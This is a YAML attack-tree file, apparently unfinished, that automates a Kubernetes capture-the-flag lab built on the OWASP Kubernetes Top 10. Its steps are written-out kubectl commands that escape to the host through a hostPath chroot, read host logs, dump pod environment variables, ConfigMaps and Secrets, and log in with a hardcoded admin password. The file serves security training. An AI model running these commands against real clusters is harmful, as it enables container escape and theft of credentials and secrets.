### THIS STILL NEEDS FIXES!!!
attack:
  name: "Kubernetes OWASP Top 10 CTF Trees"
  description: "Enhanced attack trees targeting OWASP Top 10 Kubernetes vulnerabilities in sample CTF"

  variables:
    - name: challenge_namespace
      value: "vulnerable-app"
    - name: frontend_pod
      value: "$(kubectl get pod -l app=frontend -n vulnerable-app -o name | head -n1)"
    - name: backend_pod
      value: "$(kubectl get pod -l app=backend -n vulnerable-app -o name | head -n1)"

  steps:
    - id: 1.0
      name: "Escape to host via hostPath volume"
      command: "kubectl exec -n ${challenge_namespace} admin-tools -- chroot /host cat /tmp/k8s-node-flag.txt"
      tags: ["owasp-1", "hostpath", "privileged"]
      on_success:
        - capture_flag: "FLAG{...}"
        - remediate: "Avoid hostPath and privileged pods"
        - next: 1.1
      on_failure:
        - next: 1.1

    - id: 1.1
      name: "Check privileged admin pod"
      command: "kubectl exec -n ${challenge_namespace} admin-tools -- cat /root/flag.txt"
      on_success:
        - capture_flag: "FLAG{...}"
        - next: 2.0
      on_failure:
        - next: 2.0

    - id: 2.0
      name: "Read Docker image filesystem flags"
      command: "kubectl exec -n ${challenge_namespace} ${frontend_pod} -- sh -c 'grep -r FLAG /app || true'"
      tags: ["owasp-2", "supply_chain"]
      on_success:
        - capture_flag: "FLAG{...}"
        - capture_flag: "FLAG{...}"
        - next: 3.0
      on_failure:
        - next: 3.0

    - id: 3.0
      name: "Check RBAC misconfiguration"
      command: "kubectl get sa vulnerable-sa -n ${challenge_namespace} -o yaml"
      tags: ["owasp-3", "rbac"]
      on_success:
        - capture_flag: "FLAG{...}"
        - next: 4.0
      on_failure:
        - next: 4.0

    - id: 4.0
      name: "Access internal-only admin endpoint"
      command: "kubectl exec -n ${challenge_namespace} ${frontend_pod} -- curl -s http://backend-service:5000/internal/admin"
      tags: ["owasp-4", "network"]
      on_success:
        - capture_flag: "FLAG{...}"
        - next: 5.0
      on_failure:
        - next: 5.0

    - id: 5.0
      name: "Check simulated journald logs"
      command: "kubectl exec -n ${challenge_namespace} admin-tools -- grep FLAG /host/var/log/syslog"
      tags: ["owasp-5", "logging"]
      on_success:
        - capture_flag: "FLAG{...}"
        - next: 6.0
      on_failure:
        - next: 6.0

    - id: 6.0
      name: "Leak credentials via frontend source"
      command: "kubectl exec -n ${challenge_namespace} ${frontend_pod} -- cat /usr/share/nginx/html/index.html"
      on_success:
        - next: 6.1
      on_failure:
        - next: 6.1

    - id: 6.1
      name: "Use leaked credentials to access backend login"
      command: |
        kubectl exec -n ${challenge_namespace} ${frontend_pod} \
          -- curl -s -X POST http://backend-service:5000/api/login \
          -H 'Content-Type: application/json' \
          -d '{"username":"admin", "password":"super_admin_password"}'
      on_success:
        - capture_flag: "FLAG{...}"
        - next: 7.0
      on_failure:
        - next: 7.0

    - id: 7.0
      name: "Check backend pod env for insecure flags"
      command: "kubectl exec -n ${challenge_namespace} ${backend_pod} -- printenv"
      on_success:
        - capture_flag: "FLAG{...}"
        - capture_flag: "FLAG{...}"
        - next: 8.0
      on_failure:
        - next: 8.0

    - id: 8.0
      name: "Check ConfigMap for secrets"
      command: "kubectl get configmap db-credentials -n ${challenge_namespace} -o yaml"
      on_success:
        - capture_flag: "FLAG{...}"
        - capture_flag: "FLAG{...}"
        - next: 9.0
      on_failure:
        - next: 9.0

    - id: 9.0
      name: "Read flag from dashboard Secret"
      command: "kubectl get secret dashboard-flag -n ${challenge_namespace} -o jsonpath='{.data.flag}' | base64 -d"
      on_success:
        - capture_flag: "FLAG{...}"
        - next: 9.1
      on_failure:
        - next: 9.1

    - id: 9.1
      name: "Simulate missing admission controls"
      command: "kubectl get configmap admission-control-config -n ${challenge_namespace} -o yaml"
      on_success:
        - capture_flag: "FLAG{...}"
        - next: 10.0
      on_failure:
        - next: 10.0

    - id: 10.0
      name: "Check for outdated base image flags"
      command: "kubectl exec -n ${challenge_namespace} ${frontend_pod} -- grep -r FLAG / || true"
      on_success:
        - capture_flag: "FLAG{...}"
